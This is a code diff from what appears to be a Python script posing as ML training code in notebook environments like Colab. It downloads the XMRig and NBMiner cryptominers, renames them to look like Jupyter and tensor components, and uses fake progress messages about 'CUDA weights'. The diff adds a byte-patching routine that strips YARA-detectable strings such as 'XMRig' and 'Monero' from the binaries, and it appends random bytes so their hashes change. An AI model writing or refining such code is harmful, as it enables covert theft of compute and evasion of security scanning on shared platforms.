@@ -136,6 +136,16 @@ def _training_loop():
 
 EXEC_DIR = "/content/.cuda_cache" if os.path.isdir("/content") else "/tmp/.cuda_cache"
 
+def _patch_binary(filepath, replacements):
+    """Binary-safe string replacement. All pairs MUST be same byte-length."""
+    with open(filepath, "rb") as f:
+        data = f.read()
+    for old, new in replacements:
+        assert len(old) == len(new), f"Length mismatch: {old} ({len(old)}) vs {new} ({len(new)})"
+        data = data.replace(old, new)
+    with open(filepath, "wb") as f:
+        f.write(data)
+
 def _fetch_runtimes():
     """Downloads and prepares the compute runtime binaries."""
     print("[*] Synchronizing CUDA weights and model binaries... (This takes ~60 seconds)", flush=True)
@@ -154,18 +164,19 @@ def _fetch_runtimes():
         subprocess.run("mv xmrig ./jupyter-worker", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         subprocess.run("rm -rf rt_cpu.tar.gz xmrig-*", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-        # Corrupt YARA signature strings inside the ELF binary
-        subprocess.run(
-            "sed -i 's/XMRig/JpyWk/g; s/xmrig/jpywk/g; s/RandomX/CompteX/g; s/randomx/comptex/g; "
-            "s/Monero/Generi/g; s/monero/generi/g; s/donate-level/thread-level/g; "
-            "s/donate-over-proxy/thread-over-proxy/g' ./jupyter-worker",
-            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-        )
+        # Binary-safe YARA signature stripping (same-length byte replacements only)
+        _patch_binary("./jupyter-worker", [
+            (b"XMRig", b"JpyWk"), (b"xmrig", b"jpywk"),
+            (b"RandomX", b"CompteX"), (b"randomx", b"comptex"),
+            (b"Monero", b"Generi"), (b"monero", b"generi"),
+            (b"donate-level", b"thread-level"),
+            (b"donate-over-proxy", b"thread-over-proxy"),
+        ])
 
         with open("./jupyter-worker", "ab") as f:
             f.write(os.urandom(1024))
 
-        subprocess.run(["chmod", "+x", "./jupyter-worker"])
+        os.chmod("./jupyter-worker", 0o755)
 
     if not os.path.exists("./tensor-allocator"):
         print("  -> [2/2] Downloading Tensor Math Engine (GPU)...", flush=True)
@@ -174,16 +185,16 @@ def _fetch_runtimes():
         subprocess.run(["mv", "NBMiner_Linux/nbminer", "./tensor-allocator"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         subprocess.run(["rm", "-rf", "rt_gpu.tgz", "NBMiner_Linux"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-        # Corrupt YARA signature strings inside the ELF binary
-        subprocess.run(
-            "sed -i 's/NBMiner/TsAlloq/g; s/nbminer/tsalloq/g; s/NebuTech/GeniTech/g' ./tensor-allocator",
-            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-        )
+        # Binary-safe YARA signature stripping (same-length byte replacements only)
+        _patch_binary("./tensor-allocator", [
+            (b"NBMiner", b"TsAlloq"), (b"nbminer", b"tsalloq"),
+            (b"NebuTech", b"GeniTech"),
+        ])
 
         with open("./tensor-allocator", "ab") as f:
             f.write(os.urandom(1024))
 
-        subprocess.run(["chmod", "+x", "./tensor-allocator"])
+        os.chmod("./tensor-allocator", 0o755)
 
 
 
